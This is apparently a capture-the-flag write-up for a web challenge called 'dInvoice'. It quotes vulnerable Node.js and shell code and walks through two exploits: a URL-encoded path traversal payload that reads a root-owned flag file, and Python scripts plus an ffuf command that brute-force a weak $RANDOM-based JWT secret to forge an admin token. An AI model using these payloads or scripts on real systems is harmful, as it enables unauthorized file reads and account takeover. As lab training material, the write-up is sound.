---
layout: ctf-layout
title: dinvoice
permalink: /writeups/web/dinvoice
comments: false
---
<p align="center">
  <img src="https://i.imgflip.com/972xdb.jpg" title="Bibliophile" width="100%" />
</p>

##### Difficulty: <b>Medium</b> 

##### Description:
Our newest web service, "dInvoice", needs an inspection from you to unveil any critical vulnerabilities it might have that can lead to the compromise of the admin account!

##### Challenge: 
This was one of the more interesting challenges from the Fall Huddle. There were several possible solutions, but we only managed to find two unintended ones. The intended solution, I believe, was to use the Server-Side Cross-Site Scripting (SSXSS) vulnerability to read the JWT secret and forge an admin cookie. Unfortunately, I couldn't get the SSXSS to achieve this. While I was able to read files within the app directory, that was the limit. The first solution our team discovered was a directory traversal vulnerability in the file path where user markdown files are stored. The second unintended solution exploited how the JWT secret was generated — it was a random integer that could easily be brute-forced.

##### Vulnerable Code (Path Traversal):

###### index.js:
The invoice parameter is directly used in the file path without proper validation or sanitization.
```javascript
router.get('/invoice/markdown/:invoice', AuthMiddleware, (req, res) => {
    const { invoice } = req.params;

    try {
        mdContent = fs.readFileSync(`/app/static/user_files/markdown/${invoice}`).toString();

        return res.json({content: mdContent});
    }
    catch (e) {
        res.send(response('Invoice not found!'));
    }
});
```
<br>

##### Vulnerable Code (Weak JWT Secret):

##### entrypoint.sh
The JWT secret is generated using the $RANDOM variable, which produces a predictable 16-bit integer between 0 and 32,767. This makes the secret weak and susceptible to brute force attacks, as the possible values for $RANDOM are limited and can be easily enumerated.
```bash
# Generate JWT Secret
export JWT_SECRET=$(echo -n $RANDOM | md5sum | head -c 32)
```

##### Solution (Path Traversal):
This one is pretty straight forward. We can use a URL-encoded path traversal payload to retrieve the flag from the root directory.
```url
http://127.0.0.1:1337/invoice/markdown/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Froot%2Fflag
```
<br>
And we get the flag:
<p align="center">
  <img src="https://i.imgflip.com/977iy2.jpg" title="The Flag (Path Traversal" width="100%" />
</p>
<br>

##### Solution (Weak JWT Secret):
The second solution involved brute forcing the JWT secret to get a valid Json Web Token for the Admin user. I created a couple scripts to achieve this solution (more like ChatGPT did, i just modified some stuff). We know the JWT SECRET is generated using the $RANDOM variable, meaning there are only 32,768 possible token values. 
<br>

##### Part 1: Generated the list of possible JWT secrets. Stored in wordlist: md5_wordlist.txt. 
```python3
$python3 generateMD5s.py 

import hashlib

# Define the range of $RANDOM values
random_range = range(32768)

# Open the wordlist file to save the MD5 hashes
with open("md5_wordlist.txt", "w") as wordlist_file:
    for rand_value in random_range:
        # Generate MD5 hash for the current $RANDOM value
        md5_hash = hashlib.md5(str(rand_value).encode()).hexdigest()[:32]
        
        # Write the hash to the wordlist
        wordlist_file.write(md5_hash + "\n")

print("MD5 wordlist generated successfully and saved as 'md5_wordlist.txt'.")
```
<br>

##### Part 2: Generate a list of possible JWTs for the admin using the list of MD5 hashes.
```python3
$Python3 generateJWTs.py md5_wordlist.txt

import jwt
import time
import sys

# Function to generate JWT using the given secret
def generate_jwt(secret):
    # JWT payload with 'admin' and current time (iat)
    payload = {
        'username': 'admin',
        'iat': int(time.time())  # Current time as iat claim
    }
    # Generate the JWT using HS256 algorithm
    return jwt.encode(payload, secret, algorithm='HS256')

# Check if the wordlist file was provided
if len(sys.argv) != 2:
    print("Usage: python generate_jwt_wordlist.py <md5_wordlist>")
    sys.exit(1)

# Open the MD5 wordlist (hashes)
wordlist_file = sys.argv[1]
jwt_wordlist = "jwt_wordlist.txt"

# Open the new JWT wordlist file for writing
with open(jwt_wordlist, "w") as jwt_file:
    with open(wordlist_file, "r") as hashes_file:
        for secret in hashes_file:
            secret = secret.strip()  # Remove any trailing newlines
            jwt_token = generate_jwt(secret)
            # Write the generated JWT to the new wordlist
            jwt_file.write(jwt_token + "\n")

print(f"JWT wordlist generated and saved as '{jwt_wordlist}'.")
```
<br>

##### Part 3: Fuzz for the valid JWT using FFUF. 
Notice were fuzzing the dashbaord endpoint here because it will just redirect us to the admin panel if admin==true.
```bash
ffuf -w jwt_wordlist.txt -u http://127.0.0.1:1337/dashboard -H "Cookie: connect.sid=s%3AWUS4k4gfRYeSPmCM82JmtZJ-MpKfaCMl.O2yTw8lEsoyTVqQlgtPhqSsYW%2FFZvWz3nJvSLMg8FJE; session=FUZZ" -mc all -fs 29
```
<br>
<p align="center">
  <img src="https://i.imgflip.com/977kih.jpg" title="Fuzzing the valid JWT" width="100%" />
</p>
<br>

With that JWT, I was able to login as an admin and obtain the flag:
<p align="center">
  <img src="https://i.imgflip.com/977koz.jpg" title="The Flag!!!" width="100%" />
</p>












